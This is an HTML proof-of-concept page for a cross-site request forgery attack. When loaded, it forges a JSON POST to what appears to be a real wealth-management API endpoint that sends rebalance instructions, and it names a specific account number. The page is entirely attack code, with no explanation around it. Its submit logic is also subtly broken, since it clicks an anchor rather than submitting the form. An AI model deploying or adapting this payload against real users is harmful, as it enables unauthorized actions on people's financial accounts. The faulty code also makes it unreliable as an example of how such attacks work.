<html>
  <body onload="submitForm()">
    <form id="csrf" action="https://fin-wealthcentral-advisorchannel.fmr.com/ssc/mars/wc/channel/api/v1/rebalances/workplace/send-instructions" method="POST" enctype="application/json">
      <input type="hidden" name='{"targetType":"Account","selectedAccounts":[{"accountNumber":"34850352705204","custodian":"FID","accountSource":"FPRS"}],"newRequest":true,"fsake":"' value='"}'>
    </form>

    <script>
      function submitForm() {
        var form = document.getElementById("csrf");

        // Create a dynamic anchor element
        var anchor = document.createElement("a");

        // Set the anchor attributes
        anchor.href = form.action;
        anchor.target = "_blank"; // Open in a new window/tab

        // Append the form to the anchor
        anchor.appendChild(form);

        // Trigger a click on the anchor
        anchor.click();

        // Remove the form from the anchor after submission (optional)
        setTimeout(function () {
          anchor.removeChild(form);
        }, 1000); // Adjust the delay based on your needs
      }
    </script>
  </body>
</html>





